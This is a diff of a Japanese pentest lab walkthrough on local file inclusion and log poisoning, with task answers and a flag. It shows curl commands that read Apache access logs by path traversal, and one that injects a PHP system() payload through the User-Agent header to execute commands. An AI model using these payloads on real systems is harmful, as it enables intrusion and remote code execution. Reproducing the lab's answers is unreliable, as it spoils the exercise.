@@ -1,11 +1,26 @@
 ---
+created: 2026-01-09 12:22
+modified: 2026-01-17 18:29
+environment:
+  - Server/Web
+vulnearability:
+  - LFI/LogPoisoning
+type: pentest-walkthrough
+pentest_category: Web
+platform:
+  - PurpleFlair
+tools: []
+cve: []
 tags:
-  - Webアプリ脆弱性
-title: LFI攻撃検証2
+  - Log
 ---
+
+## [Pentest-Walkthrough] Web - Project: LFI攻撃検証2
+
 Webアプリケーションを調査して脆弱性を特定し、以下に示されるタスクを完了してください。
 
 Webアプリケーションを調査
+
 以下のURLにアクセスし、問題に解答してください。
 
 ```
@@ -45,6 +60,7 @@ curl http://<target1_ip>:8080/view.php?page=../../../../../../var/log/apache2/ac
 よって、タスク2の答えは、/var/log/apache2/access.logです。
 
 解説
+
 あとは、サーバ内の/`<random>`_flag.txtを読み込めば良いので、まずはファイル名を特定します。
 
 そこで、以下のようにアクセスをします。
@@ -69,6 +85,7 @@ curl -A "<?php $echo system('cat /qieiuh121123_flag.txt'); ?>" http://<target1_i
 curl http://<target1_ip>:8080/view.php?page=../../../../../../var/log/apache2/access.log 
 
 ```
+
 すると、以下のような出力が得られます。
 
 ```
@@ -76,4 +93,3 @@ curl http://<target1_ip>:8080/view.php?page=../../../../../../var/log/apache2/ac
 ```
 
 よって、タスク3の答えは、flag{LOg_P01s0n1Ng_lf1}です。
-
